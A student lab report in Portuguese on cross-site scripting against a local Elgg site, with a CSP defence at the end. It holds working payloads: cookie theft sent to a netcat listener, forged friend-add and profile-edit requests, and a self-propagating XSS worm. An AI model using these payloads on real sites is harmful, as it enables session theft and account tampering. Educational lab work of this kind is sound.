# Laboratório 1 - Cross-Site Scripting Attack

### Felipe Junio Rezende - 11711ECP007

### Murilo Guerreiro Badoco - 11711ECP010

### **Tarefa 1** – Realizar um post de uma mensagem maliciosa para mostrar uma janela.

O objetivo da primeira tarefa era incorporar um script em algum perfil de usuário na aplicação web Elgg, e mostrar uma janela de alerta quando qualquer usuário visualizasse esse perfil malicioso. Portanto, foi feito o login no usuário de Boby e em seu perfil, na aba Brief Description, foi inserido o seguinte código JavaScript: 

```jsx
<script> alert(“XSS attack”) </script>.
```

Após realizar o POST enviando este script ao servidor é possível notar que mesmo
estando em outra conta o ataque surte o mesmo efeito como vemos abaixo:

![Laborato%CC%81rio%201%20-%20Cross-Site%20Scripting%20Attack/print2.png](Laborato%CC%81rio%201%20-%20Cross-Site%20Scripting%20Attack/print2.png)

Outro modo de realizar este ataque é por meio de um arquivo JavaScript em outro web-server, para realizá-lo configuramos outro site [www.example1.com](http://www.example1.com/) mapeando para o IP da máquina virtual em etc/hosts inserindo a seguinte linha: 127.0.0.1 [www.example1.com](http://www.example1.com/). Em seguida, criamos um virtual host para o site nas configurações do Apache inserindo a seguinte tag:

```xml
<VirtualHost *>
	ServerName     http://www.example1.com
	DocumentRoot    var/www/Example_1
<VirtualHost>
```

No diretório raiz do site criamos o seguinte documento “myscript.js” e inserimos o código:

```html
<script> alert(“Ataque XSS de outro web-server”)</script>
```

O resultado foi o mesmo como podemos ver abaixo nas screenshots tiradas:

![Laborato%CC%81rio%201%20-%20Cross-Site%20Scripting%20Attack/print3.png](Laborato%CC%81rio%201%20-%20Cross-Site%20Scripting%20Attack/print3.png)

![Laborato%CC%81rio%201%20-%20Cross-Site%20Scripting%20Attack/print4.png](Laborato%CC%81rio%201%20-%20Cross-Site%20Scripting%20Attack/print4.png)

### **Tarefa 2** – Colocando uma mensagem maliciosa para mostrar os cookies do usuário

Para esta tarefa utilizamos a conta samy em seu perfil em brief description inserimos seguinte código JavaScript: 

```html
<script> alert(document.cookie)</script>
```

O resultado pode ser visto abaixo:

![Laborato%CC%81rio%201%20-%20Cross-Site%20Scripting%20Attack/print5.png](Laborato%CC%81rio%201%20-%20Cross-Site%20Scripting%20Attack/print5.png)

### Tarefa 3 – Pegar os cookies da máquina da vítima

O objetivo agora é “roubar” os cookies do usuário. Para isso, ao acessar o perfil malicioso deve ser feita uma requisição HTTP do tipo GET para o servidor do atacante, passando como parâmetro de rota os cookies do usuário. Portanto, no perfil samy foi inserido o seguinte script:

```html
<script>document.write('<img src=http://127.0.0.1:5555?c='
+escape(document.cookie) + ' >');
</script>
```

A partir disto iniciamos um servidor TCP  na porta 5555 com o programa **netcat** a partir da seguinte linha de comando: `nc -l 5555 -v`. A partir daí, quando uma vitima entra no perfil de Samy, a requisição é gerada e seus cookies são enviados para a máquina do atacante como mostra a imagem a seguir:

![Laborato%CC%81rio%201%20-%20Cross-Site%20Scripting%20Attack/print6.png](Laborato%CC%81rio%201%20-%20Cross-Site%20Scripting%20Attack/print6.png)

### Tarefa 4 – Adicionar vítima ao entrar no perfil malicioso

Quando clicamos em adicionar um usuário, Samy por exemplo, a requisição GET enviada ao servidor é a seguinte:

[http://www.xsslabelgg.com/action/friends/add?friend=47&__elgg_ts=1616699615&__elgg_token=5oSmw9dk8t1KQLtBva99iw&__elgg_ts=1616699615&__elgg_token=5oSmw9dk8t1KQLtBva99iw](http://www.xsslabelgg.com/action/friends/add?friend=47&__elgg_ts=1616699615&__elgg_token=5oSmw9dk8t1KQLtBva99iw&__elgg_ts=1616699615&__elgg_token=5oSmw9dk8t1KQLtBva99iw)

O código disponibilizado pelo guia do laboratório apresenta um campo para a inserção da URL que será utilizada para gerar a requisição GET, e deve seguir o padrão citado acima. Primeiro deve-se inserir a URL contendo o Id do usuário a ser adicionado, seguida das variáveis token e ts, que são utilizadas como contra medida em ataques CSRF. 

O script inserido no perfil de Samy, na aba *About me*, ficou assim:

```jsx
<script type="text/javascript">
	window.onload = function () {
	var Ajax=null;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts; //1
	var token="&__elgg_token="+elgg.security.token.__elgg_token; //2
	
	//Construct the HTTP request to add Samy as a friend
	var sendurl="http://www.xsslabelgg.com/action/friends/add?friend=47" + token + ts;  //FILL IN
	
	//Create and send Ajax request to add friend
	Ajax=new XMLHttpRequest();
	Ajax.open("GET",sendurl,true);
	Ajax.setRequestHeader("Host","www.xsslabelgg.com");
	Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
	Ajax.send();
}
</script>
```

É interessante observar que logo após salvar a alteração no perfil, realizando assim um POST no servidor, a funcionalidade de adicionar à lista de amigos ocorre com o próprio Samy adicionando a si mesmo:

![Laborato%CC%81rio%201%20-%20Cross-Site%20Scripting%20Attack/Sem_ttulo.png](Laborato%CC%81rio%201%20-%20Cross-Site%20Scripting%20Attack/Sem_ttulo.png)

Quando fazemos o login em outra conta e acessamos o perfil de Samy o mesmo comportamento se repete:

![Laborato%CC%81rio%201%20-%20Cross-Site%20Scripting%20Attack/Sem_ttulo%201.png](Laborato%CC%81rio%201%20-%20Cross-Site%20Scripting%20Attack/Sem_ttulo%201.png)

### Pergunta 1 - Explique o propósito das linhas 1 e 2?

A linha 1 e 2 são as responsáveis por pegar os tokens do usuário para construir a URL, que irá gerar a requisição HTTP GET para adicionar Samy.

### Pergunta 2 - Se somente houvesse o Editor Mode em About Me você ainda conseguiria realizar o ataque?

Caso estivesse habilitado somente a opção Editor Mode o código iria ser exibido na descrição do perfil como um texto comum. No entanto, ainda seria possível realizar o ataque, mas não a partir do campo About Me, seria necessário utilizar outro campo.

### Tarefa 5 - Modificar o perfil da vítima

Para realizar esta tarefa primeiro inspecionamos como é realizada uma edição no perfil e notamos que ao realizar o POST, nos parâmetros do pacote HTTP conterá o conteúdo a ser atualizado com o nome das suas respectivas tags como é mostrado abaixo:

![Laborato%CC%81rio%201%20-%20Cross-Site%20Scripting%20Attack/print9.png](Laborato%CC%81rio%201%20-%20Cross-Site%20Scripting%20Attack/print9.png)

Quando adicionamos o código abaixo no campo *About me* no perfil Samy todos os usuário que entrarem no perfil terão seus nome alterados para "FUI ATACADO", pois este é o parâmetro que estamos enviando na tag name.

```jsx
<script type="text/javascript">
window.onload = function(){
//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
//and Security Token __elgg_token
	var userName=elgg.session.user.name;
	var guid="&guid="+elgg.session.user.guid;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	var name="&name=FUI ATACADO";

	//Construct the content of your url.
	var content= token + ts + name + guid;
	var sendurl= "http://www.xsslabelgg.com/action/profile/edit";
	var samyGuid=47;

	if(elgg.session.user.guid!=samyGuid) //1
	{
	//Create and send Ajax request to modify profile
	var Ajax=null;
	Ajax=new XMLHttpRequest();
	Ajax.open("POST",sendurl,true);
	Ajax.setRequestHeader("Host","www.xsslabelgg.com");
	Ajax.setRequestHeader("Content-Type",
	"application/x-www-form-urlencoded");
	Ajax.send(content);
}
}
</script>
```

### Pergunta 3 - O que acontece se removermos a linha 1

Caso a linha 1 seja removida, Samy irá se atacar como podemos ver:

![Laborato%CC%81rio%201%20-%20Cross-Site%20Scripting%20Attack/print11.png](Laborato%CC%81rio%201%20-%20Cross-Site%20Scripting%20Attack/print11.png)

### Tarefa 6 - Escrever um worm XSS auto-propagável

Para esta tarefa o código da tarefa 5 foi utilizado como base, a auto propagação se da pela busca no código pela tag HTML em que o id seja worm, o conteúdo desta tag então é utilizado para editar o perfil da vítima assim sempre que uma um usuário acessar um perfil infectado ele também se infectará. O código abaixo foi utilizado para realizar a propagação do worm e também adicionar Samy na lista de amigos da vitima, para isto colamos no campo About me no perfil do usuário Samy.

```jsx
<script id="worm" type="text/javascript">
window.onload = function(){
  var headerTag = "<script id=\"worm\" type=\"text/javascript\">"; 
  var jsCode = document.getElementById("worm").innerHTML;
  var tailTag = "</" + "script>";                                 

  var wormCode = encodeURIComponent(headerTag + jsCode + tailTag); 
  alert(jsCode)
                        
  var userName=elgg.session.user.name;
  var guid="&guid="+elgg.session.user.guid;
  var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
  var token="__elgg_token="+elgg.security.token.__elgg_token;

  //Requisição GET para adicionar Samy como amigo
  var sendurl="http://www.xsslabelgg.com/action/friends/add?friend=47&" + token + ts;
  var Ajax=null;
  Ajax=new XMLHttpRequest();
  Ajax.open("GET",sendurl,true);
  Ajax.setRequestHeader("Host","www.xsslabelgg.com");
  Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
  Ajax.send();

  //Requisição POST para adicionar worm à descrição das vítimas
  var sendurl="http://www.xsslabelgg.com/action/profile/edit";
  var desc = "&description=Infectado" + wormCode + "&accesslevel[description]=2";
  var content = token + ts + desc + guid;
  var samyGuid=47; 
  if(elgg.session.user.guid!=samyGuid)
	{
	//Create and send Ajax request to modify profile
	var Ajax=null;
	Ajax=new XMLHttpRequest();
	Ajax.open("POST",sendurl,true);
	Ajax.setRequestHeader("Host","www.xsslabelgg.com");
	Ajax.setRequestHeader("Content-Type",
	"application/x-www-form-urlencoded");
	Ajax.send(content);
  }
 
}
</script>
```

Boby ao entrar no perfil Samy se infectou como podemos ver:

![Laborato%CC%81rio%201%20-%20Cross-Site%20Scripting%20Attack/Untitled.png](Laborato%CC%81rio%201%20-%20Cross-Site%20Scripting%20Attack/Untitled.png)

Usuário Charlie se infectando ao acessar o perfil Boby:

![Laborato%CC%81rio%201%20-%20Cross-Site%20Scripting%20Attack/Untitled%201.png](Laborato%CC%81rio%201%20-%20Cross-Site%20Scripting%20Attack/Untitled%201.png)

Perfil do usuário Charlie após se infectar:

![Laborato%CC%81rio%201%20-%20Cross-Site%20Scripting%20Attack/Untitled%202.png](Laborato%CC%81rio%201%20-%20Cross-Site%20Scripting%20Attack/Untitled%202.png)

### Tarefa 7 - Defendendo ataques XSS utilizando CSP

Para esta tarefa o laboratório disponibilizou um arquivo python cuja função é executar um servidor, para esta tarefa também mapeamos em /etc/hosts os seguintes domínios:

```jsx
127.0.0.1 www.example32.com
127.0.0.1 www.example68.com
127.0.0.1 www.example79.com
```

Quando realizamos uma requisição na rota [http://www.example32.com:8000/csptest.html](http://www.example32.com:8000/csptest.html)  com o servidor python em execução vemos:

![Laborato%CC%81rio%201%20-%20Cross-Site%20Scripting%20Attack/print15.png](Laborato%CC%81rio%201%20-%20Cross-Site%20Scripting%20Attack/print15.png)

uma requisição na rota  [http://www.example68.com:8000/csptest.html](http://www.example32.com:8000/csptest.html) nos da a seguinte resposta e um erro por falta de ícone no servidor

![Laborato%CC%81rio%201%20-%20Cross-Site%20Scripting%20Attack/print16.png](Laborato%CC%81rio%201%20-%20Cross-Site%20Scripting%20Attack/print16.png)

já na rota  [http://www.example79.com:8000/csptest.html](http://www.example32.com:8000/csptest.html) teremos desta vez o campo 6 com resposta OK, já que a requisição está partindo da rota com final 79, portanto o script de alteração será executado.

![Laborato%CC%81rio%201%20-%20Cross-Site%20Scripting%20Attack/print18.png](Laborato%CC%81rio%201%20-%20Cross-Site%20Scripting%20Attack/print18.png)

O relatório propôs uma tarefa de exibir OK em todos os campos exceto o 3, para realiza-la definimos no header que foi injetado no pacote de resposta HTTP os domínios e nonce aceitáveis

```python
#!/usr/bin/env python3

from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import *

class MyHTTPRequestHandler(BaseHTTPRequestHandler):
  def do_GET(self):
    o = urlparse(self.path)
    f = open("." + o.path, 'rb') 
    self.send_response(200)
    self.send_header('Content-Security-Policy', 
          "default-src 'self';"
          "script-src 'self' *.example32.com:8000  *.example68.com:8000"+ 
"*.example79.com:8000 'nonce-1rA2345' 'nonce-2rB3333' ")     
    self.send_header('Content-type', 'text/html')
    self.end_headers()
    self.wfile.write(f.read())
    f.close()

httpd = HTTPServer(('127.0.0.1', 8000), MyHTTPRequestHandler)
httpd.serve_forever()
```

O resultado ocorreu como esperado:

![Laborato%CC%81rio%201%20-%20Cross-Site%20Scripting%20Attack/print17.png](Laborato%CC%81rio%201%20-%20Cross-Site%20Scripting%20Attack/print17.png)
